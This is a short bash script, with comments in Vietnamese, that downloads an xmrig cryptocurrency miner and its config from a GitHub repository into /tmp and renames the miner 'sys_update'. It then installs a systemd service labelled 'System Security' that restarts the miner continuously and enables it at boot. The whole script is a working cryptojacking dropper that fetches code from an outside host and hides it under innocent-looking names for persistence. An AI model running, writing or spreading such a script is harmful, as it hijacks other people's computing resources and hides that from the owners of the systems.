#!/bin/bash

# Tự sửa lỗi xuống dòng nếu lỡ soạn thảo trên Windows
# (Lệnh này sẽ dọn sạch ký tự \r trong chính script này)
# tr -d '\r' < "$0" > /tmp/clean_setup.sh && bash /tmp/clean_setup.sh && exit

cd /tmp

# Tải file và dùng 'tr' để lọc bỏ ký tự lạ ngay khi tải
wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -O - | tr -d '\r' > config.json
wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -O sys_update

chmod +x sys_update

# Tạo service bằng cách viết trực tiếp, tránh lỗi Here-Doc
printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n" > /etc/systemd/system/sys_update.service

systemctl daemon-reload
systemctl enable sys_update
systemctl start sys_update
